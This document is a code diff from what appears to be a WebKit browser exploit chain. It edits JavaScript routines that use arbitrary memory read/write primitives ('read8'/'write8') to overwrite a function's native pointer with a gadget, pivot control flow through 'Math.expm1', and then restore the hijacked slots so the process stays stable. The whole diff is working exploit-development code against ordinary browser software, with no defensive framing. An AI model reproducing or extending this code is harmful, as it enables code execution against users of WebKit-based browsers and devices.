@@ -202,6 +202,8 @@ export function prepNativeChain(p, off, webkitBase, cap) {
         webkitBase,
         staged: false,
         mainArmed: false,
+        _pinMainMf: mainMf,
+        _pinMainOrig: mainOrig,
     };
 }
 
@@ -555,44 +557,60 @@ export function bisectFireExpm1(p, prep) {
     Math.expm1(prep.pivotObj);
 }
 
+/** Restore poisoned pivot slots only (main m_function untouched). */
+export function bisectRestorePivotOnly(p, prep) {
+    if (!prep || !p) return 0;
+    let restored = 0;
+    const bis = prep._bisect;
+    if (bis && bis.multiSaved && bis.multiSaved.length) {
+        for (let i = 0; i < bis.multiSaved.length; i++) {
+            const e = bis.multiSaved[i];
+            if (e.val != null) {
+                p.write8(e.site, e.val);
+                restored++;
+            }
+        }
+    } else if (bis && bis.pivotSaved != null) {
+        const site = bis.pivotSite || prep.pivotCell;
+        if (site) {
+            p.write8(site, bis.pivotSaved);
+            restored = 1;
+        }
+    }
+    if (restored > 0)
+        prep._bisect = {};
+    return restored;
+}
+
+/** Blind disarm + pivot restore — no read8, no DOM. Call before any logging if G0/pivot hot. */
+export function bisectEmergencyUntangle(p, prep) {
+    if (!prep || !p) return { disarmed: false, restored: 0 };
+    const mainMf = prep._pinMainMf || prep.mainMf;
+    const mainOrig = prep._pinMainOrig != null ? prep._pinMainOrig : prep.mainOrig;
+    let disarmed = false;
+    if (mainMf && mainOrig != null) {
+        p.write8(mainMf, mainOrig);
+        prep.mainArmed = false;
+        disarmed = true;
+    }
+    const restored = bisectRestorePivotOnly(p, prep);
+    prep.staged = false;
+    return { disarmed, restored };
+}
+
 /** Drop G0 from main m_function — call before touching poisoned pivot (GC may re-enter expm1). */
 export function bisectDisarmG0(p, prep) {
     if (!prep || !prep.mainMf || prep.mainOrig == null)
         return false;
-    let looksG0 = false;
-    try {
-        if (prep.G && prep.G.G0) {
-            const cur = p.read8(prep.mainMf);
-            if (cur && String(cur) === String(prep.G.G0))
-                looksG0 = true;
-        }
-    } catch (_) { looksG0 = !!prep.mainArmed; }
-    const wasArmed = !!(prep.mainArmed || looksG0);
-    if (wasArmed)
-        p.write8(prep.mainMf, prep.mainOrig);
+    p.write8(prep.mainMf, prep.mainOrig);
     prep.mainArmed = false;
-    return wasArmed;
+    return true;
 }
 
 /** Bisect step 6 — disarm G0 first, then restore pivot hook site(s). */
 export function bisectRestore(p, prep) {
     if (!prep) return;
-    bisectDisarmG0(p, prep);
-    if (prep._bisect && prep._bisect.multiSaved) {
-        for (let i = 0; i < prep._bisect.multiSaved.length; i++) {
-            const e = prep._bisect.multiSaved[i];
-            if (e.val != null) p.write8(e.site, e.val);
-        }
-    } else {
-        const site = (prep._bisect && prep._bisect.pivotSite) || prep.pivotCell;
-        if (prep._bisect && prep._bisect.pivotSaved != null)
-            p.write8(site, prep._bisect.pivotSaved);
-    }
-    if (prep.mainMf && prep.mainOrig)
-        p.write8(prep.mainMf, prep.mainOrig);
-    prep.mainArmed = false;
-    prep.staged = false;
-    prep._bisect = {};
+    bisectEmergencyUntangle(p, prep);
 }
 
 /** Bisect step 7+ — fire after layout (assumes hook+arm or uses full fireNativeCall). */
